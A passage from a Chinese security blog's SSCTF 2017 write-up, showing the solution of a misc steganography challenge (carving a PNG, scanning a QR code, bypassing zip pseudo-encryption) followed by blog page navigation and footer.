+<p>在使用010 editor查看的时候，搜了下一些其他文件的文件头里的标志字符之类的，发现了：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-4.png" alt=""></p>
+<p>前面的coffee也好奇怪，从coffee开始截取出来，找了个png头，尝试修复一下，然后打开：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-5.png" alt=""></p>
+<p>得到一个二维码，扫一下，是让你去下载一个txt…其实这是个zip，但是后面拼接了一部分提示的字符串。</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-6.png" alt=""></p>
+<p>简直….丧心病狂。</p>
+<p>猜了好多密码…什么coffee、seclover之类的，差点要爆破了。后面队友提示说要不要试试伪加密。</p>
+<p>直接丢进010 editor 使用二进制模板解析后，修改标志位</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-7.png" alt=""></p>
+<p>然后尝试解压得到一个txt，里面是一串base64</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-8.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keyis%7Bsec1over%25_6ugscan_@coffee%7D</span><br><span class="line">#keyis&#123;sec1over%_6ugscan_@coffee&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/05/08/SSCTF-2017部分Writeup/">SSCTF-2017部分Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
+        <p><span>发布时间:</span>2017年05月08日 - 15时15分</p>
+        <p><span>最后更新:</span>2017年05月08日 - 15时17分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/05/08/SSCTF-2017部分Writeup/" title="SSCTF-2017部分Writeup">http://o0xmuhe.me/2017/05/08/SSCTF-2017部分Writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2017/05/08/SSCTF-2017部分Writeup/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/05/29/pwnhub杯CUIT第十三届校赛pwn出题及运维心得/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          pwnhub杯CUIT第十三届校赛pwn出题及运维心得
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/22/360春秋CTF-pwn/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">360春秋CTF--pwn</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pwn250"><span class="toc-number">2.</span> <span class="toc-text">Pwn250</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apk1"><span class="toc-number">3.</span> <span class="toc-text">apk1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apk2-login"><span class="toc-number">4.</span> <span class="toc-text">apk2 login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Music-300-你知道我在等你吗"><span class="toc-number">5.</span> <span class="toc-text">Music 300 你知道我在等你吗</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'o0xmuhe'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/05/29/pwnhub杯CUIT第十三届校赛pwn出题及运维心得/" title="上一篇: pwnhub杯CUIT第十三届校赛pwn出题及运维心得">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/04/22/360春秋CTF-pwn/" title="下一篇: 360春秋CTF--pwn">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/11/08/Hello-PANDA/">Hello PANDA</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/UAF-analysis-using-pykd/">UAF analysis : using pykd</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/05/代码审计培养计划/">代码审计培养计划</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/飞扬历险记/">飞扬历险记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/16/linux-code-inject/">linux code inject</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/16/比赛运维杂记/">比赛运维杂记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/09/论文阅读-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/">论文阅读<ifuzzer: an="" evolutionary="" interpreter="" fuzzer="" using="" genetic="" programming=""></ifuzzer:></a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/遗传算法初窥/">遗传算法初窥</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/Antlr4初体验/">Antlr4初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/19/mips程序调试环境折腾/">mips程序调试环境折腾</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/拯救macOS-High-sierra的硬盘空间/">拯救macOS High sierra的硬盘空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/16/Symbolic-Execution学习/">Symbolic Execution学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/11/LL-LR-SLR-LALR傻傻分不清/">LL LR SLR LALR傻傻分不清</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/20/compiler学习/">compiler学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/Unicorn-Engine初体验/">Unicorn Engine初体验</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/flex-bison读书笔记/">flex_bison读书笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/30/Python指定概率获取随机元素/">Python指定概率获取随机元素</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/01/Hello-World升级版/">Hello World升级版</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/13/babydriver-writeup/">babydriver writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/05/OpenGrok搭建/">OpenGrok搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/30/编译原理学习/">编译原理学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/TrendMicro-CTF-2017-Reverse300/">TrendMicro CTF 2017 Reverse300</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/19/Final/">Final</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/29/pwnhub杯CUIT第十三届校赛pwn出题及运维心得/">pwnhub杯CUIT第十三届校赛pwn出题及运维心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/08/SSCTF-2017部分Writeup/">SSCTF-2017部分Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/360春秋CTF-pwn/">360春秋CTF--pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/Linux-Kernel-Exploit-4-beginners/">Linux Kernel Exploit 4 beginners</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/NJCTF-2017部分wp/">NJCTF-2017部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/SECCON-2016-jmper/">SECCON-2016 jmper</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/codegate2017-angrybird/">codegate2017-angrybird</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/LLVM-Study-Log/">LLVM Study Log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/ichunqiu-CTF-2017-2/">ichunqiu-CTF-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/Adding-your-own-syscall-in-linux-kernel/">Adding your own syscall in linux kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/Windows-Kernel-Exploit-Study-3/">Windows-Kernel-Exploit-Study(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/30/Linux socket进程间通信及应用/">Linux socket进程间通信及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/28/一点碎碎念/">一点碎碎念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/22/Have-fun-with-Blind-ROP/">Have fun with Blind ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/20/Windows-Kernel-Exploit-Study-2/">Windows Kernel Exploit Study(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/what-DynELF-does-basically/">what DynELF does basically</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/17/fuzzing-with-peach-Just-a-toy/">fuzzing with peach(Just a toy)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/25/PlaidCTF-2016-butterfly/">PlaidCTF 2016 butterfly</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/Have-fun-with-glibc内存管理/">Have fun with glibc内存管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/linux-下起shell失败的分析/">linux 下起shell失败的分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/Baiudu杯-pwn专场记录/">Baiudu杯 pwn专场记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/29/how-to-compile-WinAFL/">how to compile WinAFL</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/yocto-writeup/">yocto writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/HITCON-2016-Quals-SecretHolder/">HITCON-2016-Quals-SecretHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/BCTF-cloud/">BCTF--cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/一些环境配置遇到的坑-持续更新/">一些环境配置遇到的坑(持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/16/Malloc-Maleficarum-复盘/">Malloc-Maleficarum-复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/26/初试winafl/">初试winafl</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/14/pwnable-kr-alloca/">pwnable.kr -- alloca</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/简单的尝试angr/">简单的尝试angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/第一个android-cm调试分析/">第一个android cm调试分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/install-gef/">install gef</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/30/cctf-pwn350/">cctf pwn350</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/15/heap-vuln-unlink/">heap vuln -- unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/02/format-string-with-stack-frame/">format string with stack frame</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/16/RCTF-PWN200/">RCTF -- PWN200</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/05/dragon/">dragon</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 muhe
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">访客数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
